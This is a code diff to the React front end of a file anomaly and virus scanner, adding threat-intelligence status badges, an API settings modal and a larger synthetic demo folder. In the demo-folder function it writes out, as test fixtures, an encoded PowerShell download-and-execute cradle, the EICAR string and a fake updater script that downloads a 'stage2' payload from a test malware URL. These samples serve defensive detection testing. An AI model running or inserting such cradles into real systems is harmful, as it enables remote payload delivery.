@@ -4,23 +4,48 @@ import FolderUploadSection from './components/FolderUploadSection';
 import DropZoneOverlay from './components/DropZoneOverlay';
 import ConsoleDashboard from './components/ConsoleDashboard';
 import AnomalyTable from './components/AnomalyTable';
-import { checkBackendHealth, uploadAndScanFiles } from './utils/apiService';
+import SecuritySettingsModal from './components/SecuritySettingsModal';
+import { checkBackendHealth, uploadAndScanFiles, fetchSecuritySettings } from './utils/apiService';
 
 export default function App() {
   const [folderPath, setFolderPath] = useState('');
   const [fileItems, setFileItems] = useState([]);
   const [logs, setLogs] = useState([
     `[${new Date().toLocaleTimeString()}] [SYSTEM] File Anomaly Scanner console initialized.`,
-    `[${new Date().toLocaleTimeString()}] [READY] Recursive Directory Entries API and webkitdirectory ready.`
+    `[${new Date().toLocaleTimeString()}] [READY] Recursive Directory Entries API and threat intelligence ready.`
   ]);
   const [report, setReport] = useState(null);
   const [isScanning, setIsScanning] = useState(false);
   const [backendOnline, setBackendOnline] = useState(null);
+  const [securitySettings, setSecuritySettings] = useState(null);
+  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
 
   const addLog = useCallback((message) => {
     const timestamp = new Date().toLocaleTimeString();
     setLogs((prev) => [...prev, `[${timestamp}] ${message}`]);
   }, []);
+
+  const loadSettings = useCallback(async () => {
+    try {
+      const s = await fetchSecuritySettings();
+      if (s) {
+        setSecuritySettings(s);
+        const vtStatus = s.virusTotalConfigured && s.virusTotalEnabled
+          ? 'Active'
+          : !s.virusTotalConfigured
+          ? 'Not Configured (Lookup Links Available)'
+          : 'Disabled';
+        const sbStatus = s.safeBrowsingConfigured && s.safeBrowsingEnabled
+          ? 'Active'
+          : !s.safeBrowsingConfigured
+          ? 'Not Configured'
+          : 'Disabled';
+        addLog(`[CONFIG] Threat Intel — VirusTotal: ${vtStatus} | Safe Browsing: ${sbStatus}.`);
+      }
+    } catch {
+      // Backend may be starting
+    }
+  }, [addLog]);
 
   useEffect(() => {
     async function verifyBackend() {
@@ -28,12 +53,13 @@ export default function App() {
       setBackendOnline(isUp);
       if (isUp) {
         addLog('[BACKEND] Connected to ASP.NET Core Web API on http://localhost:5000.');
+        await loadSettings();
       } else {
         addLog('[BACKEND] [WARN] Cannot reach backend API. Ensure FileAnomalyScanner is running on port 5000.');
       }
     }
     verifyBackend();
-  }, [addLog]);
+  }, [addLog, loadSettings]);
 
   const handleFilesDiscovered = (discoveredFolderName, discoveredFiles) => {
     setFolderPath(discoveredFolderName);
@@ -58,7 +84,7 @@ export default function App() {
     }
 
     setIsScanning(true);
-    addLog(`[SCAN] [START] Initiating anomaly scan for ${fileItems.length} file(s)...`);
+    addLog(`[SCAN] [START] Initiating anomaly & virus scan for ${fileItems.length} file(s)...`);
 
     try {
       const scanReport = await uploadAndScanFiles(fileItems, (progress) => {
@@ -71,7 +97,7 @@ export default function App() {
         setLogs((prev) => [...prev, ...scanReport.consoleLogs]);
       }
 
-      addLog(`[SCAN] [COMPLETE] Processed ${scanReport.summary.totalFilesScanned} files. Found ${scanReport.summary.totalAnomaliesFound} anomalies.`);
+      addLog(`[SCAN] [COMPLETE] Processed ${scanReport.summary.totalFilesScanned} files. Found ${scanReport.summary.totalAnomaliesFound} total findings (VT detections: ${scanReport.summary.virusTotalFlaggedCount || 0}, Safe Browsing: ${scanReport.summary.safeBrowsingThreatCount || 0}).`);
     } catch (err) {
       addLog(`[SCAN] [ERROR] Scan failed: ${err.message}`);
     } finally {
@@ -80,32 +106,52 @@ export default function App() {
   };
 
   const handleLoadDemoFolder = () => {
-    const cleanText = new File(["This is a legitimate plain text configuration file with normal entropy."], "config.txt", { type: "text/plain" });
+    // 1. Clean file
+    const cleanText = new File(
+      ["This is a legitimate plain text configuration file with normal entropy."],
+      "config.txt",
+      { type: "text/plain" }
+    );
 
+    // 2. High entropy
     const randomBytes = new Uint8Array(2048);
     window.crypto.getRandomValues(randomBytes);
     const highEntropyText = new File([randomBytes], "audit_notes.txt", { type: "text/plain" });
 
+    // 3. Masqueraded PE in PNG
     const mzPngBytes = new Uint8Array([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
     const disguisedPng = new File([mzPngBytes], "logo_banner.png", { type: "image/png" });
 
-    const doubleExt = new File(["MZ... payload"], "Q3_Financial_Report.pdf.exe", { type: "application/octet-stream" });
+    // 4. Double extension deceptive executable
+    const doubleExt = new File(["MZ... payload header"], "Q3_Financial_Report.pdf.exe", { type: "application/octet-stream" });
 
+    // 5. Encoded PowerShell cradle
     const scriptCradle = new File([
       "powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA="
     ], "deploy_updater.ps1", { type: "text/plain" });
+
+    // 6. EICAR Standard Antivirus Test File (Official harmless AV test signature for VirusTotal testing)
+    const eicarString = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+    const eicarFile = new File([eicarString], "eicar_antivirus_test.com.txt", { type: "text/plain" });
+
+    // 7. Script containing official Google Safe Browsing Malware test URL
+    const safeBrowsingTestScript = new File([
+      `# Automated updater script\n$dropUrl = "http://testsafebrowsing.appspot.com/s/malware.html"\nWrite-Host "Fetching remote payload from $dropUrl"\n(New-Object System.Net.WebClient).DownloadFile($dropUrl, "stage2.bin")\n`
+    ], "updater_c2_test.ps1", { type: "text/plain" });
 
     const demoItems = [
       { file: cleanText, relativePath: "DemoFolder/documents/config.txt" },
       { file: highEntropyText, relativePath: "DemoFolder/documents/audit_notes.txt" },
       { file: disguisedPng, relativePath: "DemoFolder/assets/logo_banner.png" },
       { file: doubleExt, relativePath: "DemoFolder/downloads/Q3_Financial_Report.pdf.exe" },
-      { file: scriptCradle, relativePath: "DemoFolder/scripts/deploy_updater.ps1" }
+      { file: scriptCradle, relativePath: "DemoFolder/scripts/deploy_updater.ps1" },
+      { file: eicarFile, relativePath: "DemoFolder/threats/eicar_antivirus_test.com.txt" },
+      { file: safeBrowsingTestScript, relativePath: "DemoFolder/scripts/updater_c2_test.ps1" }
     ];
 
     setFolderPath("DemoFolder");
     setFileItems(demoItems);
-    addLog("[DEMO] Injected 5 synthetic test files into queue (masqueraded PNG, high entropy TXT, double extension, powershell cradle, clean TXT).");
+    addLog("[DEMO] Injected 7 test files into queue: Standard EICAR Antivirus Test file, Google Safe Browsing malware URL script, masqueraded PNG, high entropy TXT, double extension .pdf.exe, PowerShell cradle, and clean config.");
   };
 
   return (
@@ -113,12 +159,70 @@ export default function App() {
       {/* App Header */}
       <header className="app-header">
         <div className="app-title-area">
-          <h1>File Anomaly Scanner</h1>
+          <div className="title-with-badge">
+            <h1>File Anomaly &amp; Virus Scanner</h1>
+            <span className="version-pill">v2.0 Threat Intel</span>
+          </div>
           <div className="app-subtitle">
-            Heuristic &amp; Structural File Inspection Dashboard (ASP.NET Core Web API + React)
+            Heuristic Structural Inspection + VirusTotal Antivirus Engine + Google Safe Browsing
           </div>
         </div>
+
         <div className="header-actions">
+          {/* Threat Intel Status Badges */}
+          <div className="threat-intel-indicators">
+            <span
+              className={`threat-pill ${
+                securitySettings?.virusTotalConfigured && securitySettings?.virusTotalEnabled
+                  ? 'pill-active'
+                  : !securitySettings?.virusTotalConfigured
+                  ? 'pill-unconfigured'
+                  : 'pill-disabled'
+              }`}
+              title={
+                securitySettings?.virusTotalConfigured
+                  ? `VirusTotal v3 Active (${securitySettings.maskedVirusTotalApiKey})`
+                  : 'VirusTotal Key Missing (Click API Settings to add)'
+              }
+            >
+              VT: {securitySettings?.virusTotalConfigured && securitySettings?.virusTotalEnabled
+                ? 'Active'
+                : !securitySettings?.virusTotalConfigured
+                ? 'Hash Only'
+                : 'Disabled'}
+            </span>
+
+            <span
+              className={`threat-pill ${
+                securitySettings?.safeBrowsingConfigured && securitySettings?.safeBrowsingEnabled
+                  ? 'pill-active'
+                  : !securitySettings?.safeBrowsingConfigured
+                  ? 'pill-unconfigured'
+                  : 'pill-disabled'
+              }`}
+              title={
+                securitySettings?.safeBrowsingConfigured
+                  ? `Google Safe Browsing v4 Active (${securitySettings.maskedSafeBrowsingApiKey})`
+                  : 'Google Safe Browsing Key Missing (Click API Settings to add)'
+              }
+            >
+              Safe Browsing: {securitySettings?.safeBrowsingConfigured && securitySettings?.safeBrowsingEnabled
+                ? 'Active'
+                : !securitySettings?.safeBrowsingConfigured
+                ? 'No Key'
+                : 'Disabled'}
+            </span>
+          </div>
+
+          <button
+            type="button"
+            className="btn btn-settings"
+            onClick={() => setIsSettingsOpen(true)}
+            title="Configure VirusTotal and Google Safe Browsing API Keys"
+          >
+            ⚙️ API Settings
+          </button>
+
           <span
             className={`backend-status-pill ${
               backendOnline === true
@@ -130,14 +234,14 @@ export default function App() {
           >
             Backend: {backendOnline === true ? 'Online (Port 5000)' : backendOnline === false ? 'Offline' : 'Checking...'}
           </span>
+
           <button
             type="button"
-            className="btn btn-sm"
+            className="btn btn-sm btn-demo"
             onClick={handleLoadDemoFolder}
-            style={{ marginLeft: '10px' }}
             disabled={isScanning}
           >
-            Load Synthetic Test Folder
+            🧪 Load Synthetic Test Folder
           </button>
         </div>
       </header>
@@ -164,10 +268,21 @@ export default function App() {
       {/* Scrolling Console Log Window */}
       <ConsoleDashboard logs={logs} onClearLogs={handleClearLogs} />
 
-      {/* Anomaly Results Table */}
+      {/* Anomaly & Threat Results Table */}
       <AnomalyTable
         anomalies={report ? report.anomalies : []}
         summary={report ? report.summary : null}
+        files={report ? report.files : []}
+      />
+
+      {/* Security API Settings Modal */}
+      <SecuritySettingsModal
+        isOpen={isSettingsOpen}
+        onClose={() => setIsSettingsOpen(false)}
+        onSettingsUpdated={(updated) => {
+          setSecuritySettings(updated);
+          addLog('[CONFIG] Threat intelligence API settings updated.');
+        }}
       />
     </div>
   );
